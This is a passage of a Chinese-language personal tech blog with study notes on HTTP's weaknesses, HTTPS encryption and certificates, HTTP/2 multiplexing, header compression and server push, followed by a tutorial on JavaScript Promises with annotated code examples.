-<p>content-Encoding 表示服务端压缩方法<br>Transfer-Encoding 表示服务端编码方法</p>
-<h1 id="https"><a href="#https" class="headerlink" title="https"></a>https</h1><p>http缺点</p>
-<p>1.通信使用明文(不加密)，内容可能会被窃听<br>造成原因：通信线路上的网络设备、光纤等不可能是个人私有物，不排除某个环节会遭到恶意窥视或窃听<br>解决办法：加密处理防止被窃听<br>方式一：通信加密，使用SSL和TLS建立安全通信线路，再在这条线路上进行HTTP通信<br>方式二：内容加密，对HTTP协议传输的内容本身加密，前提要求服务端和客户端都具备加密解密机制</p>
-<p>2.不验证通信方的身份，因此可能遭遇伪装<br>造成原因：服务器不管谁发来的请求都会给一个响应，客户端不管是谁的响应都接收<br>解决办法：查明对方证书，证书由第三发颁发，通信前先确认对方证书,验证时要通信的双方后，再继续通信</p>
-<p>3.无法证明报文完整性，所以有可能已遭篡改<br>中间人攻击：请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击<br>造成原因：中间人攻击<br>解决办法：MD5和SHA-1等散列值校验的方法,以及用来确认文件的数字签名方法,但以上方法都需要用户本人自己验证</p>
-<h2 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护 = HTTPS"></a>HTTP+加密+认证+完整性保护 = HTTPS</h2><p>HTTP通信接口部分用SSL和TLS协议代替，即不再是http与TCP通信，而是http和SSL再和TCP通信<br>共享/对称密钥加密：加密和解密用同一个密钥<br>公开密钥加密：<br>使用一对非对称的密钥,一把叫做私有密钥，另一把叫做公开密钥,<br>使用公开密钥进行加密发送密文，收信方收到信息后用私有密钥进行解密<br>公开密钥加密方式比共享密钥加密方式处理起来更麻烦</p>
-<p>HTTPS混合加密：在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式<br>缺点：无法保证公开密钥本身是真正的公开密钥<br>解决办法：使用数字证书进行验证，客户端根据数字证书机构的公开密钥验证数字签名，从而验证服务器公开密钥<br><img src="/image/header6.png" alt="header6"><br>关于证书：<br>客户端证书一般由银行等特殊业务颁发，因为客户端证书需要费用支出<br>自签名证书无法保证通信真实性<br>中级认证机构的证书可能变成自认证证书<br>HTTPS的安全通信机制<br><img src="/image/header7.png" alt="header7"><br><img src="/image/header8.png" alt="header8"><br>步骤12结束之后，客户端再发送TCP FIN报文来关闭与TCP的通信<br>缺点：<br>1.由于加密解密过程消耗大量CPU以及内存等资源，导致处理速度变慢<br>2.由于SSL通信部分消耗网络资源，处理通信部分又会消耗一定时间，因此相比http又会变慢<br>解决办法：使用SSL加速器以分担负载</p>
-<p>不使用https原因：<br>1.客户端要考虑消耗cpu,内存资源，服务器端要考虑负载<br>2.购买证书需要开销</p>
-<h1 id="用户认证"><a href="#用户认证" class="headerlink" title="用户认证"></a>用户认证</h1><p>方法有BASIC认证，DIGEST认证，SSL客户端认证，FormBase认证</p>
-<h1 id="HTTP-2-O"><a href="#HTTP-2-O" class="headerlink" title="HTTP/2.O"></a>HTTP/2.O</h1><p>http2.0协议优点<br>1.采用二进制进行流式传输，使用HPACK压缩消息头，节省宽带<br>2.使用tcp多路复用，降低网络请求链接时建立关闭的开销<br>这里要与区别keep-alive作区分<br>keep-alive发生在应用层，而tcp复用发生在传输层<br>keep-alive多文件只能串行传输，一个传完再传一个，而TCP多文件可以并行同时传输<br>3.可以控制传输流优先级和流量<br>4.支持服务端推送</p>
-<h2 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h2><h3 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>在http/1.x下,浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞<br>突发性和短时性的 HTTP 连接因为三次握手和慢启动的存在，非常浪费时间(–&gt;单一长连接)<br>(慢启动:TCP连接在一开始会限制连接最大速度，确认数据能够成功传输后，随时间推移才会慢慢提高传输速度)</p>
-<h3 id="实现–二进制分帧"><a href="#实现–二进制分帧" class="headerlink" title="实现–二进制分帧"></a>实现–二进制分帧</h3><p>在应用层和传输层之间增加二进制分帧层,应用层生成的报文会分割封装为更小的消息和帧，并进行二进制编码<br>其中首部header和请求主体request body分别被封装为header frame 和data frame<br>同一请求或响应的帧会有相同标志，会按照一定先后顺序被发送，<br>所以不同的请求或者响应可以互相穿插着给到对方<br>最终实现就是<br>一个包含上百个资源的页面，在http1.x协议下会创建多条TCP链接来进行串行请求<br>在http/2.0下只会创建一个长TCP链接，所有的资源请求在压缩处理后一次性发出去,并行地在一个TCP连接上双向交换信息<br>（同一链接上有多个不同方向的数据流在传输。客户端可以一边乱序发送stream，也可以一边接收服务器的响应，而服务器那端同理。）</p>
-<p>而且可以对资源设置优先级，优先级能动态的被改变，优先级高的资源能够被更快的下载下来并得到执行</p>
-<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>由于 TCP 连接的减少而使网络拥塞状况得以改善,使拥塞和丢包恢复速度更快<br>单一长连接多资源的方式，减少服务端的链接压力,避免网络开销，内存占用更少,提高连接吞吐量</p>
-<h2 id="压缩头部"><a href="#压缩头部" class="headerlink" title="压缩头部"></a>压缩头部</h2><p>通信连接建立之后，由于cookie和user agent很容易膨胀，<br>每次请求的头部如果有相同的部分，还要以纯文本传输重复发送的话，就会造成流量浪费<br>因此在客户端和服务端都存放一个首部表，来跟踪和存储之前发送的键值对，对于相同的头部，不必再通过请求发送，只需发送一次<br>如果首部发生变化，就在压缩时只将变化的数据放在header帧里面进行发送，<br>无论是客户端还是服务器端收到首部帧后，就对首部表进行更新</p>
-<h2 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h2><p>就是客户端请求一次资源，服务器给多个响应，这些多个响应很有可能是浏览器解析Html后继续要请求的资源，即主动将资源推送给客户端<br>而客户端可以做的就是可以将他们缓存起来做备用</p>
-<h2 id="延伸问题"><a href="#延伸问题" class="headerlink" title="延伸问题"></a>延伸问题</h2><p>1.如何解决推送资源重复或不需要的问题？<br>客户端使用一个简洁的 Cache Digest 来告诉服务器，哪些东西已经在缓存，因此服务器也就会知道哪些是客户端所需要的。<br><a href="https://www.zhihu.com/question/24774343/answer/96586977" target="_blank" rel="noopener">相关链接</a></p>
-<p>2.为什么HTTP2能去掉SSL在HTTP1.x上的开销<br>单一的长连接，减少了SSL握手的开销<br>头部被压缩，减少了数据传输量<br>多路复用能大幅提高传输效率，不用等待上一个请求的响应<br>不用像http1.x那样把多个文件或者资源弄成一个文件或者资源（http1.x常见的优化手段），<br>这时候，缓存就能更容易命中啊（http1.x里面你揉成一团的东西怎么命中缓存？）<br><a href="https://www.qcloud.com/community/article/541321?fromSource=gwzcw.93399.93399.93399" target="_blank" rel="noopener">相关链接</a></p>
-<p><a href="https://www.zhihu.com/question/34074946" target="_blank" rel="noopener">相关链接</a></p>
-<h2 id="遗留疑问"><a href="#遗留疑问" class="headerlink" title="遗留疑问"></a>遗留疑问</h2><p>二进制分帧和TCP切割分包是如何具体实现的，二进制分帧优势具体在哪里？<br>http/2.0各层协议具体工作<br><a href="https://github.com/zqjflash/http2-protocol" target="_blank" rel="noopener">待读</a></p>
-<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>从输入 URL 到页面展现中间发生了什么？&lt;另外的角度看问题&gt;</p>
-<p>DNS 查询 DNS 缓存<br>建立 TCP 连接（三次握手）连接复用<br>发送 HTTP 请求（请求的四部分）<br>后台处理请求<br>监听 80 端口<br>路由<br>渲染 HTML 模板<br>生成响应<br>发送 HTTP 响应<br>关闭 TCP 连接（四次挥手）<br>解析 HTML<br>下载 CSS（缓存<br>解析 CSS<br>下载 JS（缓存<br>解析 JS<br>下载图片<br>解析图片<br>渲染 DOM 树<br>渲染样式树<br>执行 JS</p>
-<p>七层协议<br>应用层<br>表示层<br>会话层<br>传输层<br>网络层<br>数据链路层<br>物理层</p>
-<h1 id="实时通信协议"><a href="#实时通信协议" class="headerlink" title="实时通信协议"></a>实时通信协议</h1><p>webSocket<br>Poll轮询<br>Long-poll 长轮询 （二维码登录）<br>DDP(分布式数据协议)[使用json数据格式在客户端与服务端进行数据传输，但存在兼容问题]</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/promise.html">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="YooHannah">
-    <meta itemprop="description" content>
-    <meta itemprop="image" content="/psb.jpg">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="My Little World">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="My Little World" src>
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/post/js/promise.html" itemprop="url">
-                  关于promise
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-31T22:19:37+08:00">
-                2017-08-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h1><p>Promise 是异步编程的一种解决方案</p>
-<h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  // ... some code</span><br><span class="line"></span><br><span class="line">  if (/* 异步操作成功 */)&#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    reject(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise</span><br><span class="line">.then(function(value) &#123;      //resolve(value);回调函数</span><br><span class="line">  // success</span><br><span class="line">&#125;, function(error) &#123;         // reject(error);回调函数</span><br><span class="line">  // failure</span><br><span class="line">&#125;)</span><br><span class="line">.catch(function(error) &#123;</span><br><span class="line">  // 处理 getJSON 和 前一个回调函数运行时发生的错误</span><br><span class="line">  console.log(&apos;发生错误！&apos;, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>1、Promise对象是一个构造函数,用来生成Promise实例,<br>2、Promise构造函数的参数是一个函数,该函数有两个参数,分别是两个函数:resolve和 reject<br>3、resolve函数在promise对象状态从Pending变为Fulfiled时调用,即异步操作成功的时候调用,参数一般为获取的结果，方便回调函数使用，或者另一个promise实例,继续进行回调<br>   reject函数在promise对象状态从Pending变为Rejected时调用,即异步操作失败的时候调用，参数一般为错误Error对象,报出错误<br>4、Promise实例生成以后，可以用then方法分别指定Resolved状态和Rejected状态的回调函数<br>5、then方法有两个参数，均为匿名函数，第一个匿名函数为resolve()的定义,第二个参数为reject()的定义<br>6、Promise对象状态变为Resolved，则会调用then方法指定的回调函数;如果异步操作抛出错误,状态就会变为Rejected,就会调用catch方法指定的回调函数,处理这个错误。<br>   另外,then方法指定的回调函数，如果运行中抛出错误，也会被catch方法捕获。<br>   注意,如果then方法定义了reject(),将不会再调用catch方法,如果then里面没有reject，发生错误时将会调用catch</p>
-<h1 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h1><p>1.then方法会在与promise同步的任务完成之后再执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  console.log(&apos;Promise&apos;);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.then(function() &#123;</span><br><span class="line">  console.log(&apos;Resolved.&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;Hi!&apos;);</span><br><span class="line">//打印顺序</span><br><span class="line">&quot;Promise&quot;</span><br><span class="line">&quot;Hi!&quot;</span><br><span class="line">&quot;Resolved.&quot;</span><br></pre></td></tr></table></figure></p>
-<p>Promise 新建后立即执行，所以首先输出的是Promise。然后,then方法指定的回调函数,将在当前脚本所有同步任务执行完才会执行,所以Resolved最后输出。</p>
-<p>2、如果Promise1的resolved返回另一个promise2,那Promise1的then会根据promise2的状态决定执行reject还是resolved<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var p1 = new Promise(function (resolve, reject) &#123;</span><br><span class="line">  setTimeout(() =&gt; reject(new Error(&apos;fail&apos;)), 3000)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">var p2 = new Promise(function (resolve, reject) &#123;</span><br><span class="line">  setTimeout(() =&gt; resolve(p1), 1000)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p2</span><br><span class="line">  .then(result =&gt; console.log(result))</span><br><span class="line">  .catch(error =&gt; console.log(error))</span><br><span class="line">// Error: fail</span><br></pre></td></tr></table></figure></p>
-<p>上面代码中，p1是一个Promise，3秒之后变为rejected。p2的状态在1秒之后改变，resolve方法返回的是p1。由于p2返回的是另一个 Promise，导致p2自己的状态无效了，由p1的状态决定p2的状态。所以，后面的then语句都变成针对后者（p1）。又过了2秒，p1变为rejected，导致触发catch方法指定的回调函数。</p>
-<p>3、在Promise构造函数的参数函数里,在调用resolve()或reject()之后,仍会执行后续语句,但如果是抛错语句将不会执行,同样在抛错语句之后的resolve()调用也不会被执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  resolve(&apos;ok&apos;);</span><br><span class="line">  console.log(&apos;1111&apos;)</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(function(value) &#123; console.log(value) &#125;)</span><br><span class="line">  .catch(function(error) &#123; console.log(&apos;报错啦&apos;) &#125;);</span><br><span class="line">//1111</span><br><span class="line">//ok</span><br><span class="line">//因为立即 resolved 的 Promise 是在本轮事件循环的末尾执行，总是晚于本轮循环的同步任务,所以会先打印1111,,再打印ok</span><br><span class="line"></span><br><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  return resolve(&apos;ok&apos;);</span><br><span class="line">  console.log(&apos;1111&apos;)</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(function(value) &#123; console.log(value) &#125;)</span><br><span class="line">  .catch(function(error) &#123; console.log(&apos;报错啦&apos;) &#125;);</span><br><span class="line">//ok</span><br><span class="line">//return 方法阻止继续执行后续操作</span><br><span class="line"></span><br><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  resolve(&apos;ok&apos;);</span><br><span class="line">  throw new Error(&apos;test&apos;);</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(function(value) &#123; console.log(value) &#125;)</span><br><span class="line">  .catch(function(error) &#123; console.log(&apos;报错啦&apos;) &#125;);</span><br><span class="line">  //ok</span><br><span class="line"></span><br><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  throw new Error(&apos;test&apos;);</span><br><span class="line">  resolve(&apos;ok&apos;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(function(value) &#123; console.log(value) &#125;)</span><br><span class="line">  .catch(function(error) &#123; console.log(&apos;报错啦&apos;) &#125;);</span><br><span class="line">//报错啦</span><br></pre></td></tr></table></figure></p>
-<p>4、then方法会返回一个promise对象，因此可以继续在then函数后面加then函数,这时前面then函数应该会return一个结果值作为后面then函数的参数,<br>   前面then函数如果执行resolve()则后面then函数也会执行resolve(),前面then函数如果执行reject()则后面then函数也会执行reject(),<br>   但如果前面then函数return一个promise对象,那后面的then函数将会根据这个promise的执行结果去执行resolve()还是reject()<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">var promise = new Promise(function(resolve, reject)&#123;</span><br><span class="line">    resolve(123)</span><br><span class="line">  &#125;);</span><br><span class="line">promise.then(function(json) &#123;</span><br><span class="line">  console.log(&apos;Contents: &apos; + json);</span><br><span class="line">  return 1223;</span><br><span class="line">&#125;, function(error) &#123;</span><br><span class="line">  console.error(&apos;出错了&apos;, error);</span><br><span class="line">  return &apos;2423&apos;</span><br><span class="line">&#125;)</span><br><span class="line">.then(function(val)&#123;</span><br><span class="line">  console.log(val);</span><br><span class="line">&#125;,function(val)&#123;</span><br><span class="line">  console.log(val)</span><br><span class="line">&#125;);</span><br><span class="line">//&quot;Contents: 123&quot;</span><br><span class="line">//1223</span><br><span class="line"></span><br><span class="line">var promise = new Promise(function(resolve, reject)&#123;</span><br><span class="line">    reject(456)</span><br><span class="line">  &#125;);</span><br><span class="line">promise.then(function(json) &#123;</span><br><span class="line">  console.log(&apos;Contents: &apos; + json);</span><br><span class="line">  return 1223;</span><br><span class="line">&#125;, function(val,error) &#123;</span><br><span class="line">  console.log(val);</span><br><span class="line">  console.error(&apos;出错了&apos;, error);</span><br><span class="line">  return &apos;2423&apos;</span><br><span class="line">&#125;)</span><br><span class="line">.then(function(val)&#123;</span><br><span class="line">  console.log(val);</span><br><span class="line">&#125;,function(val)&#123;</span><br><span class="line">  console.log(val)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//456</span><br><span class="line">//&quot;出错了&quot;</span><br><span class="line">//&quot;2423&quot;</span><br><span class="line"></span><br><span class="line">var promise = new Promise(function(resolve, reject)&#123;</span><br><span class="line">//     resolve(123)</span><br><span class="line">    reject(456)</span><br><span class="line">  &#125;);</span><br><span class="line">var promise1 = new Promise(function(resolve, reject)&#123;</span><br><span class="line">    resolve(789)</span><br><span class="line">  &#125;);</span><br><span class="line">promise.then(function(json) &#123;</span><br><span class="line">  console.log(&apos;Contents: &apos; + json);</span><br><span class="line">  return 1223;</span><br><span class="line">&#125;, function(val,error) &#123;</span><br><span class="line">  console.log(val);</span><br><span class="line">  console.error(&apos;出错了&apos;, error);</span><br><span class="line">  return promise1</span><br><span class="line">&#125;)</span><br><span class="line">.then(function(val)&#123;</span><br><span class="line">  console.log(111+val);</span><br><span class="line">&#125;,function(val)&#123;</span><br><span class="line">  console.log(222+val)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//456</span><br><span class="line">//&quot;出错了&quot;</span><br><span class="line">//900</span><br></pre></td></tr></table></figure></p>
-<p>then 方法链式调用箭头函数格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">promise.then(</span><br><span class="line">  param1 =&gt; &#123;&#125;</span><br><span class="line">).then(</span><br><span class="line">  param2 =&gt; &#123;&#125;,</span><br><span class="line">  err =&gt; &#123;&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
-<p>5、promise 如果发生了错误,无论reject()或者catch在哪一层，会一直向后传递，直到被捕获为止，即遇到reject()或者catch就会抛出来,如果后续所有回调函数中都没有reject()或者catch,错误就不会被抛出来<br>  catch方法会返回一个promise,所以可以继续写then(),catch()抛完错之后会继续执行后面这个then()<br>  catch()里面还可以再抛错，如果catch后面没有reject()或者catch()，错误将不会被抛出来<br>  如果catch之前的promise没有遇到错误,catch之后又有then(),则执行流程会跳过catch,继续执行catch后面的then<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  throw new Error(&apos;test&apos;);</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(function(value) &#123; console.log(value); return &apos;2&apos;&#125;, function() &#123; //捕获test</span><br><span class="line">  throw new Error(&apos;test1&apos;);</span><br><span class="line">&#125;)</span><br><span class="line">  .then(function(value) &#123; console.log(value);return &apos;3&apos; &#125;)</span><br><span class="line">  .catch(function(error) &#123; console.log(error);return &apos;4&apos;&#125;) //捕获test1</span><br><span class="line">  .then(function(value) &#123; console.log(value); &#125;) //4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  resolve(&apos;1&apos;)</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(function(value) &#123; console.log(value); return &apos;2&apos;&#125;, function() &#123; //1</span><br><span class="line">  throw new Error(&apos;test1&apos;);</span><br><span class="line">&#125;)</span><br><span class="line">  .then(function(value) &#123; console.log(value);return &apos;3&apos; &#125;)//2</span><br><span class="line">  .catch(function(error) &#123; console.log(error) return &apos;4&apos;&#125;)</span><br><span class="line">  .then(function(value) &#123; console.log(value); &#125;)//3 没遇到错误直接跳过来</span><br><span class="line"></span><br><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">  throw new Error(&apos;test&apos;);</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(function(value) &#123; console.log(value); return &apos;2&apos;&#125;, function(error) &#123; //捕获test</span><br><span class="line">  console.log(error)</span><br><span class="line">  throw new Error(&apos;test1&apos;);</span><br><span class="line">&#125;)</span><br><span class="line">  .then(function(value) &#123; console.log(value);return &apos;3&apos; &#125;)</span><br><span class="line">  .catch(function(error) &#123; console.log(error);throw new Error(&apos;test2&apos;); return &apos;4&apos;&#125;) //捕获test1</span><br><span class="line">  .then(function(value) &#123; console.log(value); &#125;,function(error)&#123;//捕获test2</span><br><span class="line">   console.log(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>6.promise resolve return err 并不会被catch 或者reject捕获,会将错误以参数形式传给then的resolve回调函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Promise.resolve()</span><br><span class="line">  .then(() =&gt; &#123;</span><br><span class="line">    return new Error(&apos;error!!!&apos;)</span><br><span class="line">  &#125;)</span><br><span class="line">  .then((res) =&gt; &#123;</span><br><span class="line">    console.log(&apos;then: &apos;, res) //打印出err</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch((err) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch: &apos;, err)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></p>
-<p>then 或 .catch 返回的值不能是 promise 本身，否则会造成死循环<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const promise = Promise.resolve()</span><br><span class="line">  .then(() =&gt; &#123;</span><br><span class="line">    return promise</span><br><span class="line">  &#125;)</span><br><span class="line">promise.catch(console.error)</span><br><span class="line"></span><br><span class="line">//抛错</span><br></pre></td></tr></table></figure></p>
-<p>.then 或者 .catch 的参数期望是函数，传入非函数则会发生值穿透<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Promise.resolve(1)</span><br><span class="line">  .then(2)</span><br><span class="line">  .then(Promise.resolve(3))</span><br><span class="line">  .then(console.log) ///打印1</span><br></pre></td></tr></table></figure></p>
-<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><h2 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all"></a>Promise.all</h2><p>用于将多个 Promise 实例，包装成一个新的 Promise 实例<br>var p = Promise.all([p1, p2, p3])<br>p的状态由p1、p2、p3决定，分成两种情况。<br>（1）只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。</p>
-<p>（2）只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。</p>
-<h2 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race"></a>Promise.race</h2><p>将多个Promise实例，包装成一个新的Promise实例<br>var p = Promise.race([p1, p2, p3]);<br>只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数</p>
-<h2 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve"></a>Promise.resolve</h2><p>将现有对象转为Promise对象<br>var Promise = Promise.resolve(参数);</p>
